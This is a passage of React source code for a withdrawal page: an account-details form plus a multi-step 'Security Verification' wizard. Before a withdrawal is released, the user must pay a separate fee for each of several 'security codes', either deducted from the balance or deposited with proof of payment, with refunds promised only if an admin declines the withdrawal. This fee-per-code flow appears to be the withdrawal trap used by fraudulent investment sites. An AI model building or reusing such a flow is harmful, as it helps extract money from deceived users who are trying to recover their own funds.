                    : 'border-gray-200 hover:border-gray-300'
                    }`}
                  onClick={() => setSelectedMethod(method)}
                >
                  <div className="flex items-center space-x-3">
                    {method.logo && (
                      <Image src={method.logo} alt={method.name} width={28} height={28} className="w-7 h-7 mobile:w-8 mobile:h-8 rounded" />
                    )}
                    <div>
                      <h3 className="font-semibold text-gray-900 text-sm mobile:text-base">{method.name}</h3>
                    </div>
                  </div>
                </motion.div>
              ))}
            </div>
          </div>

          <div>
            <label className="block text-sm font-medium text-gray-700 mb-2">Withdrawal Amount ({currencyCode})</label>
            <input
              type="number"
              value={amount}
              onChange={(e) => setAmount(e.target.value)}
              className={`w-full px-4 py-2.5 mobile:py-3 border rounded-lg focus:ring-2 focus:border-transparent text-sm mobile:text-base ${amount && !isAmountValid
                ? 'border-[#0E5A50] focus:ring-[#0E5A50] bg-[#EDF2F0]'
                : 'border-gray-300 focus:ring-[#0E5A50]'
                }`}
              placeholder="Enter amount to withdraw"
              min="1"
              step="0.01"
              max={availableBalance}
              required
            />
            {amount && !isAmountValid && (
              <p className="mt-1 text-sm text-[#0E5A50]">
                Amount exceeds available balance ({currencySymbol}{(availableBalance).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })})
              </p>
            )}
            {amount && isAmountValid && (
              <p className="mt-1 text-sm text-green-600">
                Available balance: {currencySymbol}{(availableBalance).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
              </p>
            )}
            {!amount && (
              <p className="text-sm text-gray-500 mt-1">
                Available balance: {currencySymbol}{(availableBalance).toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
              </p>
            )}
          </div>

          <div className="space-y-3 mobile:space-y-4">
            <h3 className="text-base mobile:text-lg font-semibold text-gray-900">Your Account Details</h3>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Account Holder Name *</label>
              <input
                type="text"
                value={accountName}
                onChange={(e) => setAccountName(e.target.value)}
                className="w-full px-4 py-2.5 mobile:py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0E5A50] focus:border-transparent text-sm mobile:text-base"
                placeholder="Enter account holder name"
                required
              />
            </div>

            <div>
              <label className="block text-sm font-medium text-gray-700 mb-2">Account Number/Wallet Address *</label>
              <input
                type="text"
                value={accountNumber}
                onChange={(e) => setAccountNumber(e.target.value)}
                className="w-full px-4 py-2.5 mobile:py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0E5A50] focus:border-transparent text-sm mobile:text-base"
                placeholder="Enter account number or wallet address"
                required
              />
            </div>

            {selectedMethod?.accountDetails?.bankName && (
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Bank Name</label>
                <input
                  type="text"
                  value={bankName}
                  onChange={(e) => setBankName(e.target.value)}
                  className="w-full px-4 py-2.5 mobile:py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0E5A50] focus:border-transparent text-sm mobile:text-base"
                  placeholder="Enter bank name"
                />
              </div>
            )}

            {selectedMethod?.accountDetails?.network && (
              <div>
                <label className="block text-sm font-medium text-gray-700 mb-2">Network</label>
                <input
                  type="text"
                  value={network}
                  onChange={(e) => setNetwork(e.target.value)}
                  className="w-full px-4 py-2.5 mobile:py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0E5A50] focus:border-transparent text-sm mobile:text-base"
                  placeholder="Enter network (e.g., Ethereum, BSC)"
                />
              </div>
            )}
          </div>

          <button
            type="submit"
            disabled={!isFormValid || isSubmitting || userProfile?.kycStatus !== 'verified'}
            className={`w-full text-white py-2.5 mobile:py-3 px-6 rounded-lg font-semibold transition-colors duration-200 flex items-center justify-center space-x-2 text-sm mobile:text-base ${!isFormValid && !isSubmitting
              ? 'bg-[#0E5A50] hover:bg-[#0E5A50]'
              : 'bg-[#14130F] hover:bg-[#232220] disabled:bg-gray-400 text-primary-500'
              }`}
          >
            {isSubmitting ? (
              <>
                <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                <span>Submitting...</span>
              </>
            ) : (
              <>
                <CreditCard className="w-5 h-5" />
                <span>Submit Withdrawal Request</span>
              </>
            )}
          </button>
        </form>
      </div>

      {/* Multi-code wizard modal */}
      <AnimatePresence>
        {wizardOpen && currentCodeType && currentLabel && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-50 bg-black/50 flex items-center justify-center p-4"
            onClick={(e) => { if (e.target === e.currentTarget && wizardStep !== 'awaiting_deposit' && !wizardProcessing) handleWizardClose(); }}
          >
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              className="bg-white rounded-xl shadow-2xl w-full max-w-md p-6 mobile:p-8 relative"
            >
              <button
                onClick={handleWizardClose}
                disabled={wizardProcessing}
                className="absolute top-4 right-4 text-gray-400 hover:text-gray-700 disabled:opacity-50"
                aria-label="Close"
              >
                <X className="w-5 h-5" />
              </button>

              <div className="flex items-center justify-between mb-4 pr-8">
                <h3 className="text-lg font-bold text-gray-900">Security Verification</h3>
                {totalSteps > 1 && (
                  <span className="text-xs text-gray-500">Step {stepNumber} of {totalSteps}</span>
                )}
              </div>

              <div className="bg-gray-50 rounded-lg px-4 py-3 mb-4 flex items-center justify-between">
                <span className="text-xs uppercase tracking-wider text-gray-500 font-semibold">Withdrawal amount</span>
                <span className="text-lg font-bold text-gray-900">
                  {getCurrencySymbol(wizardCurrency)}{wizardAmount.toLocaleString(undefined, { minimumFractionDigits: 2, maximumFractionDigits: 2 })}
                </span>
              </div>

              {totalSteps > 1 && (
                <div className="flex gap-1 mb-5">
                  {wizardOrder.map((_, i) => (
                    <div
                      key={i}
                      className={`h-1 flex-1 rounded-full ${i < wizardIndex ? 'bg-green-500' : i === wizardIndex ? 'bg-[#0E5A50]' : 'bg-gray-200'}`}
                    />
                  ))}
                </div>
              )}

              <div className="mb-5">
                <div className="flex items-center space-x-3 mb-2">
                  <div className="w-10 h-10 rounded-full bg-[#EDF2F0] flex items-center justify-center">
                    <KeyRound className="w-5 h-5 text-[#0E5A50]" />
                  </div>
                  <div>
                    <h4 className="font-semibold text-gray-900">{currentLabel.name}</h4>
                    <p className="text-xs text-gray-500">{currentLabel.description}</p>
                  </div>
                </div>
              </div>

              {wizardStep === 'issue' && (
                <div className="text-center py-6">
                  {wizardProcessing && !wizardError ? (
                    <>
                      <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-[#0E5A50] mx-auto mb-3"></div>
                      <p className="text-sm text-gray-600">Preparing your security code…</p>
                    </>
                  ) : (
                    <>
                      {wizardError && <p className="text-sm text-[#0E5A50] mb-3">{wizardError}</p>}
                      <button
                        onClick={() => wizardDraftId && wizardIssuedType && issueCurrentCode(wizardDraftId, wizardIssuedType)}
                        className="bg-[#14130F] hover:bg-[#232220] text-white py-2.5 px-6 rounded-lg font-semibold"
                      >
                        Retry Issuing Code
                      </button>
                    </>
                  )}
                </div>
              )}

              {wizardStep === 'deposit' && wizardIssuedType && (
                <div className="space-y-4">
                  <div className="rounded-lg p-4 bg-orange-50 border border-orange-200">
                    <div className="flex items-start space-x-2">
                      <CreditCard className="w-5 h-5 text-orange-600 mt-0.5" />
                      <div className="text-sm text-orange-800">
                        <p className="font-semibold mb-1">A fee is required to obtain this code</p>
                        <p>
                          Pay <strong>{currencySymbol}{preflightPrice(wizardIssuedType).toFixed(2)}</strong> via the payment method you selected. Once your deposit is verified, your security code will be issued automatically.
                        </p>
                        <p className="mt-1 text-xs text-orange-700">If your withdrawal is later declined by an admin, these fees are refunded to your balance.</p>
                      </div>
                    </div>
                  </div>

                  {wizardError && (
                    <p className="text-sm text-[#0E5A50]">{wizardError}</p>
                  )}

                  <button
                    onClick={createFeeDeposit}
                    disabled={wizardProcessing}
                    className="w-full bg-[#14130F] hover:bg-[#232220] disabled:bg-gray-400 text-white py-3 rounded-lg font-semibold flex items-center justify-center space-x-2"
                  >
                    {wizardProcessing ? (
                      <>
                        <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                        <span>Submitting…</span>
                      </>
                    ) : (
                      <span>Pay Code Fee & Request Code</span>
                    )}
                  </button>
                </div>
              )}

              {wizardStep === 'awaiting_deposit' && (
                <div className="space-y-4 text-center py-4">
                  {wizardDepositStatus !== 'rejected' && !wizardError ? (
                    <>
                      <div className="animate-spin rounded-full h-10 w-10 border-b-2 border-[#0E5A50] mx-auto"></div>
                      <div>
                        <h4 className="font-semibold text-gray-900 mb-1">Awaiting fee deposit verification</h4>
                        <p className="text-sm text-gray-600">
                          Complete the {currencySymbol}{preflightPrice(wizardIssuedType!).toFixed(2)} payment using the instructions sent to you, then upload your proof of payment. Your code will appear here as soon as it's verified.
                        </p>
                        {wizardDepositStatus && (
                          <p className="text-xs text-gray-500 mt-2">Status: <strong>{wizardDepositStatus.replace('_', ' ')}</strong></p>
                        )}
                      </div>
                    </>
                  ) : (
                    <>
                      {wizardError && (
                        <p className="text-sm text-[#0E5A50]">{wizardError}</p>
                      )}
                      <button
                        onClick={() => {
                          if (wizardPollCancel) wizardPollCancel();
                          setWizardPollCancel(null);
                          setWizardDepositId(null);
                          setWizardDepositStatus(null);
                          setWizardError(null);
                          setWizardStep('deposit');
                        }}
                        className="bg-[#14130F] hover:bg-[#232220] text-white py-2.5 px-6 rounded-lg font-semibold"
                      >
                        Try Again
                      </button>
                    </>
                  )}
                </div>
              )}

              {wizardStep === 'enter' && wizardIssueData && (
                <div className="space-y-4">
                  <div className={`rounded-lg p-4 ${wizardIssueData.free ? 'bg-blue-50 border border-blue-200' : 'bg-orange-50 border border-orange-200'}`}>
                    <div className="flex items-start space-x-2">
                      <Mail className={`w-5 h-5 mt-0.5 ${wizardIssueData.free ? 'text-blue-600' : 'text-orange-600'}`} />
                      <div className="text-sm">
                        {wizardIssueData.free ? (
                          <p className="text-blue-800">
                            A free {currentLabel.name.toLowerCase()} has been generated and emailed to you. Enter it below to continue.
                          </p>
                        ) : (
                          <p className="text-orange-800">
                            A fee of <strong>{currencySymbol}{wizardIssueData.price.toFixed(2)}</strong> was deducted from your balance and a code was emailed to you. Enter it below to continue.
                          </p>
                        )}
                      </div>
                    </div>
                  </div>

                  {wizardIssueData.code && (
                    <div className="rounded-lg p-4 bg-gray-900 text-white text-center">
                      <p className="text-xs uppercase tracking-wider text-gray-400 mb-1">Your security code</p>
                      <p className="text-3xl font-mono font-bold tracking-[0.4em]">{wizardIssueData.code}</p>
                      <p className="text-[10px] text-gray-400 mt-2">Also sent to your registered email. Expires in 10 minutes.</p>
                    </div>
                  )}

                  <div>
                    <label className="block text-sm font-medium text-gray-700 mb-2">Enter the 6-digit code</label>
                    <input
                      type="text"
                      inputMode="numeric"
                      maxLength={6}
                      value={wizardEnteredCode}
                      onChange={(e) => {
                        const next = e.target.value.replace(/\D/g, '');
                        setWizardEnteredCode(next);
                        if (next.length === 6) {
                          // auto-submit when 6 digits entered
                        }
                      }}
                      className="w-full px-4 py-3 border border-gray-300 rounded-lg focus:ring-2 focus:ring-[#0E5A50] focus:border-transparent text-center text-lg tracking-widest font-mono"
                      placeholder="000000"
                      autoFocus
                    />
                  </div>

                  {wizardError && (
                    <p className="text-sm text-[#0E5A50]">{wizardError}</p>
                  )}

                  <button
                    onClick={handleVerifyCode}
                    disabled={wizardProcessing || wizardEnteredCode.length !== 6}
                    className="w-full bg-[#14130F] hover:bg-[#232220] disabled:bg-gray-400 text-white py-3 rounded-lg font-semibold flex items-center justify-center space-x-2"
                  >
                    {wizardProcessing ? (
                      <>
                        <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                        <span>Verifying…</span>
                      </>
                    ) : (
                      <span>Verify Code</span>
                    )}
                  </button>
                </div>
              )}

              {wizardStep === 'verify' && wizardIndex >= wizardOrder.length && (
                <div className="space-y-4">
                  <div className="bg-green-50 border border-green-200 rounded-lg p-4 flex items-start space-x-2">
                    <CheckCircle2 className="w-5 h-5 text-green-600 mt-0.5" />
                    <p className="text-sm text-green-800">
                      All required codes have been verified. Confirm your transaction PIN to finalize the withdrawal.
                    </p>
                  </div>

                  {wizardError && (
                    <p className="text-sm text-[#0E5A50]">{wizardError}</p>
                  )}

                  <button
                    onClick={handleFinalSubmit}
                    disabled={wizardProcessing}
                    className="w-full bg-[#14130F] hover:bg-[#232220] disabled:bg-gray-400 text-white py-3 rounded-lg font-semibold flex items-center justify-center space-x-2"
                  >
                    {wizardProcessing ? (
                      <>
                        <div className="animate-spin rounded-full h-5 w-5 border-b-2 border-white"></div>
                        <span>Submitting…</span>
                      </>
                    ) : (
                      <span>Confirm & Submit Withdrawal</span>
                    )}
                  </button>
                </div>
              )}

              {wizardStep === 'done' && (
                <div className="text-center py-6">
                  <div className="w-12 h-12 rounded-full bg-green-100 flex items-center justify-center mx-auto mb-3">
                    <CheckCircle2 className="w-7 h-7 text-green-600" />
                  </div>
                  <h4 className="font-semibold text-gray-900 mb-1">Withdrawal Submitted</h4>
                  <p className="text-sm text-gray-600">Your request has been sent for admin processing.</p>
                </div>
              )}
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>

      {/* Cancel-confirmation modal */}
      <AnimatePresence>
        {cancelConfirmOpen && (
          <motion.div
            initial={{ opacity: 0 }}
            animate={{ opacity: 1 }}
            exit={{ opacity: 0 }}
            className="fixed inset-0 z-[60] bg-black/60 flex items-center justify-center p-4"
            onClick={(e) => { if (e.target === e.currentTarget) setCancelConfirmOpen(null); }}
          >
            <motion.div
              initial={{ scale: 0.95, opacity: 0 }}
              animate={{ scale: 1, opacity: 1 }}
              exit={{ scale: 0.95, opacity: 0 }}
              className="bg-white rounded-xl shadow-2xl w-full max-w-sm p-6 mobile:p-8"
            >
              <div className="flex items-center space-x-3 mb-3">
                <div className="w-10 h-10 rounded-full bg-red-100 flex items-center justify-center">
                  <X className="w-5 h-5 text-red-600" />
                </div>
                <h3 className="text-lg font-bold text-gray-900">Cancel this withdrawal?</h3>
              </div>
              <p className="text-sm text-gray-700 mb-2">
                This will discard your current progress, including any verified security codes for this withdrawal.
              </p>
              <p className="text-xs text-gray-500 mb-5">
                Note: any code-fee deposits you've already paid are refunded to your balance if your withdrawal is declined by an admin. You can start a new withdrawal at any time.
              </p>
              <div className="flex items-center justify-end space-x-3">
                <button
                  onClick={() => setCancelConfirmOpen(null)}
                  className="px-4 py-2 border border-gray-300 text-gray-700 hover:bg-gray-50 rounded-lg font-semibold"
                >
                  Keep Withdrawal
                </button>
                <button
                  onClick={confirmResumeCancel}
                  className="px-4 py-2 bg-red-600 hover:bg-red-700 text-white rounded-lg font-semibold"
                >
                  Yes, Cancel
                </button>
              </div>
            </motion.div>
          </motion.div>
        )}
      </AnimatePresence>
    </div>
  );
};

export default WithdrawSection;